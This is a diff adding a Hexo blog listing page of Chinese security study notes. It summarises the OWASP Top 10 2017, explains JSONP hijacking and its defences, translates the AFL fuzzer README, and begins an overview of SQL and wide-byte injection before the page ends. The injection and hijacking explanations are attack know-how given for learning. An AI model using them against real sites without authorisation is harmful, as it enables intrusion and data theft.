@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-owasp-top10-2017" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/02/owasp-top10-2017/" class="article-date">
+  <time datetime="2018-01-02T14:34:24.000Z" itemprop="datePublished">2018-01-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/02/owasp-top10-2017/">owasp-top10-2017</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近一直在整合知识点。忽然想起上次看OWASP top 10 好像是3年前的事了，前段时间听说top10 更新了，本来觉得更新来更新去也就那些漏洞没什么好关注的。今天晚上忽然问自己OWASP TOP 10漏洞分别是什么。我居然列不出来。惭愧。还是记录一下比较好。<br>上OWASP中文官网上获取了最新的2017版的TOP10漏洞排行，发现确实和以前不同了。</p>
+<ul>
+<li>A1: 注入 将不信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如：SQL注入, NoSQL注入，OS命令注入和LDAP注入的注入缺陷。</li>
+<li>A2：失效的身份认证，错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，攻击者用其他开发缺陷类暂时或永久性冒充其他用户身份。</li>
+<li>A3: 敏感数据泄露：许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</li>
+<li>A4: XML外部实体：许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</li>
+<li>A5：失效的控制访问：未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</li>
+<li>A6：安全配置错误：安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</li>
+<li>A7:    跨站脚本（XSS）:当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建HTML或JavaScript 的浏览器API 更新现有的网页时，就会出现XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</li>
+<li>A8: 不安全的反序列化：不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</li>
+<li>A9: 使用含有已知漏洞的组件: 组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</li>
+<li>A10: 不足的日志记录和监控:不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</li>
+</ul>
+<p><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.02.pdf" target="_blank" rel="noopener">下载OWASP TOP 10 </a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/01/02/owasp-top10-2017/" data-id="cjk8lemlj000b48s3piodyxyn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-jsonp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/26/jsonp/" class="article-date">
+  <time datetime="2017-12-25T16:22:21.000Z" itemprop="datePublished">2017-12-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/12/26/jsonp/">jsonp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JSON-劫持漏洞"><a href="#JSON-劫持漏洞" class="headerlink" title="JSON 劫持漏洞"></a>JSON 劫持漏洞</h1><h1 id="基本名词理解"><a href="#基本名词理解" class="headerlink" title="基本名词理解"></a>基本名词理解</h1><h2 id="什么是AJAX"><a href="#什么是AJAX" class="headerlink" title="什么是AJAX"></a>什么是AJAX</h2><p>AJAX是Asynchronous Javscript and XML<br>ajax 不是新的编程语言，而是一种使用现有标准的新方法。ajax是与服务器交换数据并更新部分网页的艺术。在不重新加载整个页面的情况下。<br>ajax 是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换。ajax可以使网页实现异步更新。这意味这在不重新加载整个网页的情况下，对网页的某部分进行更新。而传统的网页（不使用ajax）如果需要更新内容必须重载整个网页面。<br>　　ajax的优点：</p>
+<p>　　1、最大的一点是页面无刷新，用户的体验非常好。<br>　　2、使用异步方式与服务器通信，具有更加迅速的响应能力。。<br>　　3、可以把以前一些服务器负担的工作转嫁到客户端，利用客户端闲置的能力来处理，减轻服务器和带宽的负担，节约空间和宽带租用成本。并且减轻服务器的负担，ajax的原则是“按需取数据”，可以最大程度的减少冗余请求，和响应对服务器造成的负担。<br>　　4、基于标准化的并被广泛支持的技术，不需要下载插件或者小程序。<br>　　5、ajax可使因特网应用程序更小、更快，更友好。</p>
+<p>　　ajax的缺点：</p>
+<p>　　1、ajax不支持浏览器back按钮。<br>　　2、安全问题 AJAX暴露了与服务器交互的细节。<br>　　3、对搜索引擎的支持比较弱。<br>　　4、破坏了程序的异常机制。<br>　　5、不容易调试。</p>
+<h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><p>目前常见的跨域方法有五种：</p>
+<ul>
+<li>使用ajax，利用xmlhttprequest获取，服务端数据服务端代理实现跨域</li>
+<li>jsonp 。其核心就是动态调用《script》标签调用服务器提供的js脚本。</li>
+<li>windows.name 跨域。winows.name属性有个特征：即在一个窗口（windows）的生命周期内，窗口载入的所有页面都是一个共享的windows.name.</li>
+<li>document.domain + iframe 设置document.domain实现不同子域名之间的跨域。</li>
+<li>html5新特性 windows.postMessage.是用来像其它windows对象发送消息，无论这个windows 对象是属于同源还是不同源。</li>
+</ul>
+<h2 id="JSONP-劫持漏洞"><a href="#JSONP-劫持漏洞" class="headerlink" title="JSONP 劫持漏洞"></a>JSONP 劫持漏洞</h2><p>JSONP劫持漏洞以前在乌云知识库里见过。有些不太理解。他的方式很像CSRF，但是圈内人把它分开单独成为一类漏洞。看完了几篇文章我自己总结了一下JSONP劫持。<br>漏洞原理：A网站存在一个数据接口用于其它网站的数据交互。这个接口是以jsonp的形式来实现的。但是接口数据是敏感的隐私数据，理论上需要做访问控制，A站开发人员没做，那么导致此处成为了一个jsonp劫持点。<br>当用户登录了A站，在用户登录cookie或其它授权还有效的时间内，我们让用户访问威胁网站B站。B站页面中包含一个script是用来引用A站JSONP点的敏感数据的，由于这个劫持点还没有做安全限制，用户的浏览器会带上有效的身份认证去获取数据，B站的JS就获取了用户的数据，这是可以再操作，将数据用于其它用途。</p>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ul>
+<li>首先可以对referer 进行验证。</li>
+<li>token的加入，严格来说，这种利用javascript hijacking的方式获取数据是CSRF的一种，不过较之传统的CSRF不能获取数据只能提交而言，这种方式利用javascript可以获取一些敏感信息而已。如果我们能让攻击者对接口未知，就可以实现json  hijacking的防御了。利用token对调用者的身份进行认证，这种方式对于调用者的身份会要求力度较细，但是一旦出现xss也可能导致前端Token的泄露，从而导致保护失效。</li>
+<li>对于同域的json使用情况下，可以在数据的输出头部加入while(1);的方式避免数据被script标签的方式引用，这可以防止一些比较有特性的浏览器里导致的数据泄漏。</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://justcoding.iteye.com/blog/1366102" target="_blank" rel="noopener">http://justcoding.iteye.com/blog/1366102</a><br><a href="http://www.cnblogs.com/wuyanliang/p/5840057.html" target="_blank" rel="noopener">http://www.cnblogs.com/wuyanliang/p/5840057.html</a><br><a href="http://" target="_blank" rel="noopener">https://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html</a><br><a href="http://" target="_blank" rel="noopener">https://www.cnblogs.com/yzg1/p/5070037.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/papers-42.html[](http://)" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/papers-42.html[](http://)</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/12/26/jsonp/" data-id="cjk8lemkb000548s3rj9fcopz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-afl-README-cn" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/07/afl-README-cn/" class="article-date">
+  <time datetime="2017-12-07T15:56:43.000Z" itemprop="datePublished">2017-12-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/12/07/afl-README-cn/">afl-README-cn</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>转载：<a href="http://blog.csdn.net/abcdyzhang/article/details/53727221" target="_blank" rel="noopener">http://blog.csdn.net/abcdyzhang/article/details/53727221</a></p>
+<h1 id="AFL-简介"><a href="#AFL-简介" class="headerlink" title="AFL-简介"></a>AFL-简介</h1><pre><code>fuzzing 是漏洞挖掘领域最有效的方法之一，可以用来发现大量内存错误漏洞。然而fuzzing 的优势是相对肤浅和盲目的，随意变异使得我们很难实现达到程序特定的代码路径。这就使得测试的代码覆盖率很低。
+有人试图去解决这个问题，Tavis曾经提出一种：语料精馏法。这个方法更具代码覆盖率，从大量高质量的输入文件语料中选取一个子集，然后按照传统的方法去Fuzz。这种方法很有效，但前提是需要一个这样的语料。另一方面，代码覆盖率只是提供了一个很简单的对程序状态的描述，当Fuzzing测试到了一定程度，代码覆盖率就没什么作用了。
+所以，大家在探索更复杂的技术，比如：程序控制流分析，符号执行或静态分析。这些技术在实验中是很有前途的，但是在实际应用中显得效率底下，缺乏可靠性。
+</code></pre><h2 id="AFL的方案"><a href="#AFL的方案" class="headerlink" title="AFL的方案"></a>AFL的方案</h2><p>   AFL是一个暴力方法的fuzzer，采用了一个极其简单但是绝对可靠的，插桩代码导向的遗传算法。<br>   它使用一种自定义的边缘覆盖率来识别程序控制流的局部变化。<br>   简单来说，整个算法的逻辑如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1) Load user-supplied initial test cases into the queue,</span><br><span class="line">- 2) Take next input file from the queue,</span><br><span class="line">3) Attempt to trim the test case to the smallest size that doesn&apos;t alter</span><br><span class="line">   the measured behavior of the program,</span><br><span class="line">4) Repeatedly mutate the file using a balanced and well-researched variety</span><br><span class="line">   of traditional fuzzing strategies,</span><br><span class="line">5) If any of the generated mutations resulted in a new state transition</span><br><span class="line">   recorded by the instrumentation, add mutated output as a new entry in the</span><br><span class="line">   queue.</span><br><span class="line">6) Go to 2.</span><br></pre></td></tr></table></figure></p>
+<pre><code>被选择出来的测试用例会进行周期性的删减，消除哪些已经被更新的，更高覆盖率的废弃的测试用例。
+整个fuzing过程，会产生一个很有用的测试集合的语料库，可以用来对一些浏览器、office应用、不开源的软件进行压力测试。
+经测试。AFL的性能比blind fuzzing 或者 coverage-only 工具高多了。
+</code></pre><h2 id="使用AFL插桩程序"><a href="#使用AFL插桩程序" class="headerlink" title="使用AFL插桩程序"></a>使用AFL插桩程序</h2><pre><code>有源码的时候，我们可以在编译期间进行instrument.这种instrument对性能影响很小。
+gcc/g++ 重新源码编译的方法是：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=/path/to/afl/afl-gcc ./configure</span><br><span class="line">make clean all</span><br></pre></td></tr></table></figure>
+
+C++需要多加一个 `CXX=/path/to/afl-g++`
+afl-clang 和afl-clang++ 使用方法类似。clang 用户还可以选择更高效的插桩模式参考llvm_mode
+当测试一个lib的时候，我们需要写一个小程序，把stdin中的或者一个文件中读取数据，然后传入到被测试的lib里。这种情况下，我们必须把插好桩的库的静态版本和可执行文件链接起来。或者确保运行时加载正确.so文件。最简单的方法就是静态构建。方法如下；
+`CC=/path/to/afl/afl-gcc ./configure –disable-shared`
+*如果设置AFL_HARDEN=1，当调用‘make’时会导致CC自动启动代码hardening选项，使得检测内存bug更简单。Libdislocator，是AFL的一个辅助库（在Libdislocator/README.dislocator中），可以帮助发现heap corruption堆溢出问题。*
+</code></pre><h2 id="对无源码的二进制插桩"><a href="#对无源码的二进制插桩" class="headerlink" title="对无源码的二进制插桩"></a>对无源码的二进制插桩</h2><pre><code>AFL对没有源代码的程序提供的黑盒二进制instrument支持是实验性的。通过qemu的用户级(userland)仿真实现。
+QEMU是独立于AFL的工程，但是在AFL中也提供了便于实现该功能的方式：
+$ cd qemu_mode
+$ ./build_qemu_support.sh
+更多的说明和注意事项，在qemu_mode/README.qemu中。
+这种模式比编译时instrument慢2到5倍，而且不利于并行处理。
+所以最好还是对有源码的fuzzing吧
+</code></pre><h2 id="开始Fuzzing"><a href="#开始Fuzzing" class="headerlink" title="开始Fuzzing"></a>开始Fuzzing</h2><p>afl-fuzz负责进行fuzzing的过程，需要指定一个初始test cases的输入目录、一个存放findings结构的输出目录和要测试的目标程序的路径。<br>对那些可以直接从stdin读取输入的目标程序来说，语法如下：<br>$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]<br>对从文件读取输入的目标程序来说，要用“@@”，语法如下：<br>$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@<br>也可以用-f选项，把变异数据写到一个指定的文件。<br>对于没有被instrument的二进制目标程序，可以用qemu模式(-Q)进行fuzz，或者直接用传统blind-fuzzer模式（-n）。<br>使用-t和-m选项，修改fuzz过程的默认timeout和memory limit。<br>一般afl-fuzz在开始时会执行一系列的确定性fuzzing步骤，这会花费几天的时间，但是会生成更neat的testcase。如果你想要快速运行、马上生成dirty的结果—-类似于zzuf和其他传统fuzzer—-可以使用-d选项，跳过确定性fuzzing步骤。</p>
+<h2 id="fuzzing的输出文件说明"><a href="#fuzzing的输出文件说明" class="headerlink" title="fuzzing的输出文件说明"></a>fuzzing的输出文件说明</h2><p>有关如何解释显示的统计信息和监视进程的运行状况的信息，请参阅status_screen.txt文件。<br>Fuzzing过程中，会在输出目录中创建3个子目录并实时更新：</p>
+<ul>
+<li>queue/ - 每个独特执行路径的test case，加上用户给定的初始文件。这就是the synthesized corpus合成语料库。可以使用afl-cmin缩小size。</li>
+<li>crashes/ - 导致程序接收fatal信号(e.g., SIGSEGV, SIGILL, SIGABRT)的unique test case。会根据信号的不同进行分组。</li>
+<li>hangs/ - unique test cases that cause the tested program to time out.<br>如果相关联的执行路径包含在先前记录的故障中未见到的任何状态转换，则崩溃和挂起被认为是“unique”。<br>Crashes and hangs are considered “unique” if the associated execution paths involve any state transitions not seen in previously-recorded faults.<br>The file names for crashes and hangs are correlated with parent, non-faulting queue entries. This should help with debugging.<br>crash和hang的文件名与parent和非故障队列条目有关。这应该有助于调试。<br>当您无法重现由afl-fuzz发现的崩溃时，最可能的原因是您没有设置与该工具使用的内存限制相同。尝试：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ LIMIT_MB=50</span><br><span class="line">$ ( ulimit -Sv $[LIMIT_MB &lt;&lt; 10]; /path/to/tested_binary ... )</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>更改LIMIT_MB以匹配传递给afl-fuzz的-m参数。<br>任何现有输出目录也可用于恢复已中止的jobs；try：<br><code>$ ./afl-fuzz -i- -o existing_output_dir [...etc...]  //-i之后并没有输入目录，而是一个连接符，</code><br>如果您安装了gnuplot，您还可以使用afl-plot为任何活动的模糊任务生成一些漂亮的图形。</p>
+<h2 id="并行Fuzzing"><a href="#并行Fuzzing" class="headerlink" title="并行Fuzzing"></a>并行Fuzzing</h2><p>afl-fuzz的每个实例都占用大约一个核心。 这意味着在多核系统上，并行化是必须的以充分利用硬件。 有关如何在多个内核或多个网络机器上fuzz一个共同目标的提示，请参阅parallel_fuzzing.txt。<br>并行Fuzzing模式还提供了一种用于将AFL与其他模糊器，符号执行或者concolic混合符号执行引擎等连接的简单方法;  请参阅parallel_fuzzing.txt的最后一节提示。<br>PS: -M  和 -S 参数</p>
+<h1 id="Fuzzer-dictionaries字典"><a href="#Fuzzer-dictionaries字典" class="headerlink" title="Fuzzer dictionaries字典"></a>Fuzzer dictionaries字典</h1><p>(没试过，还不理解)<br>afl-fuzz变异引擎针对紧凑的数据格式（即，图像，多媒体，压缩数据，正则表达式语法或shell脚本）进行了优化。它有点不太适合特别冗长和冗余的语言 - 尤其包括HTML，SQL或JavaScript。<br>为了避免构建语法感知工具的麻烦，afl-fuzz提供了一种使用语言关键字，magic header或其他与目标数据类型相关联的特殊表示的可选字典为模糊过程提供种子的方法 - 并且使用它来重建底层语法,参考:<br><a href="http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html" target="_blank" rel="noopener">参考链接</a><br>要使用这个功能，首先需要创建在dictionaries/README.dictionaries中讨论的两种格式之一的字典；然后在命令行中使用-x选项将fuzzer指向它。（在该目录的子目录下已经提供了几个常用字典）<br>没有办法提供更多结构化的底层语法的描述，但是fuzzer可能会根据单独的插桩反馈来找出其中的一些。 参考：<br><a href="http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html" target="_blank" rel="noopener">http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html</a><br>PS:即使当没有给出明确的字典时，afl-fuzz将通过在确定性字节翻转期间非常仔细地观察插桩来尝试提取输入语料库中的现有语法表示（token-表示，记号）。 这适用于一些类型的解析器和语法，但不像-x模式那么好。<br>如果字典真的很难得到，另一个选择是让AFL运行一段时间，然后使用AFL自带的表示捕获库。 有关详细信息，请参阅libtokencap/README.tokencap。<br><strong>在<a href="http://volatileminds.net/2015/08/20/advanced-afl-usage-preeny.html中有关于字典的使用和简单介绍。" target="_blank" rel="noopener">http://volatileminds.net/2015/08/20/advanced-afl-usage-preeny.html中有关于字典的使用和简单介绍。</a></strong></p>
+<h2 id="crash分类Crash-triage"><a href="#crash分类Crash-triage" class="headerlink" title="crash分类Crash triage"></a>crash分类Crash triage</h2><p>基于覆盖的崩溃分组通常生成一个小数据集，可以手动或使用非常简单的GDB或Valgrind脚本快速分类。每个崩溃也可追溯到其在queue中的非崩溃的parent测试用例，从而更容易诊断故障。<br>afl-fuzz的支持一个崩溃探索模式，使用-C标志。<a href="https://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html" target="_blank" rel="noopener">https://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html</a><br>在这种模式下，模糊器需要一个或多个崩溃的测试用例作为输入，并使用其反馈驱动的fuzzing策略来快速枚举程序中可以到达的所有代码路径，同时保持其处于崩溃状态。<br>不导致崩溃的变异被拒绝; 任何不影响执行路径的更改也一样。<br>输出是一个小文件库，可以快速检查攻击者对故障地址的控制程度，或者是否有可能通过一个初始的越界读取，以及查看下面的内容 。<br>afl-tmin工具适用于crash和non-crash的test case。用于test case 最小化！注意：afl-tmin是对一个文件的无用字节、bit的删减以达到最小化。<br><code>$ ./afl-tmin -i test_case -o minimized_result -- /path/to/program [...]</code><br><em>afl-analyze工具。它需要一个输入文件，尝试顺序翻转字节，并观察被测试程序的行为。然后对输入进行颜色编码，基于哪些部分看起来是关键的，哪些部分不是;虽然不是防弹，它通常可以提供对复杂文件格式的快速洞察。</em><br>PS: 什么是防弹？？</p>
+<h2 id="常识性的风险Common-sense-risks"><a href="#常识性的风险Common-sense-risks" class="headerlink" title="常识性的风险Common-sense risks"></a>常识性的风险Common-sense risks</h2><p>与其他计算密集型任务类似，fuzzing可能会给你的硬件或系统带来压力， A good way to monitor disk I/O on Linux is the ‘iostat’ command:<br><code>$ iostat -d 3 -x -k [...optional disk ID...]</code></p>
+<h2 id="已知的限制和改进的领域Known-limitations-amp-areas-for-improvement"><a href="#已知的限制和改进的领域Known-limitations-amp-areas-for-improvement" class="headerlink" title="已知的限制和改进的领域Known limitations &amp; areas for improvement"></a>已知的限制和改进的领域Known limitations &amp; areas for improvement</h2><p> -AFL通过检查由于信号（SIGSEGV，SIGABRT等）导致的第一个引起的进程死亡来检测故障。为这些信号安装自定义处理程序的程序可能需要注释掉相关代码。同样，由目标产生的子处理中的错误可能会逃避检测，除非您手动添加一些代码来捕获它。<br>    -与任何其他强力工具一样，如果使用加密，校验和，加密签名或压缩来完全包装要测试的实际数据格式，则模糊器提供有限的覆盖率。<br>要解决这个问题，你可以注释掉相关的检查；如果这是不可能的，你也可以写一个后处理器postprocessor，参考experimental/post_library/。<br>-有一些不幸的折衷对于ASAN和64位二进制。这不是由于afl-fuzz的任何特定故障;请参阅notes_for_asan.txt提示。<br>-没有直接支持fuzzing网络服务，后台守护进程或需要UI交互工作的交互式应用程序。您可能需要进行简单的代码更改，以使它们以更传统的方式运行。Preeny可以提供一个相对简单的选项，看看：<br>  <a href="https://github.com/zardus/preeny" target="_blank" rel="noopener">https://github.com/zardus/preeny</a><br>有关修改基于网络的服务的一些有用的提示还可以在以下网址找到：https：//<a href="http://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop" target="_blank" rel="noopener">www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop</a><br>-AFL不输出人类可读的覆盖数据。如果你想监视覆盖，使用afl-cov从Michael Rash：<a href="https://github.com/mrash/afl-cov" target="_blank" rel="noopener">https://github.com/mrash/afl-cov</a><br>-偶尔，有意识的机器反对他们的创造者。如果发生这种情况，请参阅<a href="http://lcamtuf.coredump.cx/prep/。" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/prep/。</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/12/07/afl-README-cn/" data-id="cjk8lemk0000248s35j51zflf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-afl使用内存盘fuzz" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/07/afl使用内存盘fuzz/" class="article-date">
+  <time datetime="2017-12-07T15:42:27.000Z" itemprop="datePublished">2017-12-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/12/07/afl使用内存盘fuzz/">afl使用内存盘fuzz</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="AFL-fuzz-使用内存盘读写数据"><a href="#AFL-fuzz-使用内存盘读写数据" class="headerlink" title="AFL-fuzz 使用内存盘读写数据"></a>AFL-fuzz 使用内存盘读写数据</h1><h2 id="mark"><a href="#mark" class="headerlink" title="mark"></a>mark</h2><p>Fuzzing 的过程中对磁盘的读写量是非常大的。长时间的fuzzing对SSD和机械硬盘来说都是很伤使用寿命的。<br>为了钱包和硬盘中的其它数据考虑，fuzzing软件最好用内存盘来存放输入输出数据。<br>具体命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/afl-ramdisk &amp;&amp; chmod 777 /tmp/afl-ramdisk</span><br><span class="line">mount -t tmpfs -o size=512M tmpfs /tmp/afl-ramdisk</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>size的大小根据个人情况设定。执行玩上面两条命令，然后把输入输出文件夹或者整个fuzz项目都转移到新建的内存文件夹里面就好了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/12/07/afl使用内存盘fuzz/" data-id="cjk8lemkr000948s3pv53h07e" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-web常见通用漏洞原理总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/13/web常见通用漏洞原理总结/" class="article-date">
+  <time datetime="2017-11-13T12:49:26.000Z" itemprop="datePublished">2017-11-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/11/13/web常见通用漏洞原理总结/">web常见通用漏洞原理总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一-SQL注入漏洞"><a href="#一-SQL注入漏洞" class="headerlink" title="一.  SQL注入漏洞"></a>一.  SQL注入漏洞</h2><p>就是把用户可控的一些变量，带入到了数据库的各种操作当中，并且没有做好过滤。<br>数字型注入：变量没有被单引号封住，不需要用单引号区分数据和sql命令，会让GPC机制无用，<br>防范方法：强制类型转换</p>
+<p>字符型sql注入：有单引号封住，闭合需要单引号。这个<br>全局没有做addslashes ，查询时对一些用户可控变量进行addslashes ()，那么可以找没有被addsashes()的变量。</p>
+<p>GPC：开启magic_quote_gpc=on之后，能实现addslshes()和stripslashes()这两个函数的功能，就是在’ “ \ 前面加转义字符。Php4.0到php5.4版本默认开启。</p>
+<p>宽字节注入：用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节</p>
+<h3 id="MYSQL的字符集转换过程"><a href="#MYSQL的字符集转换过程" class="headerlink" title="MYSQL的字符集转换过程"></a>MYSQL的字符集转换过程</h3><ol>
+<li>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</li>
+<li>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：<br> • 使用每个数据字段的CHARACTER SET设定值；<br> • 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；<br> • 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；<br> • 若上述值不存在，则使用character_set_server设定值。<br>总的来说，就是将操作结果从内部操作字符集转换为character_set_results。</li>
+</ol>
+<p>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。<br>怎么吃的GBK编码在的%df会自动拼接%5c，因此吃掉\,而后面的ascii字符就保留了下来。<br>其它的宽字符集也是一样的分析过程，要吃掉%5c，只需要低位中包含正常的0x5c就行了。<br>防范。就是GBK编码的地位包含了%5c，所以会自动连接%5c。吃掉它。</p>
+<p>那么宽字节注入是由于转编码而形成的，那具有转编码功能的函数也成了漏洞的成因。<br>mb_convert_encoding()<br>iconv()</p>
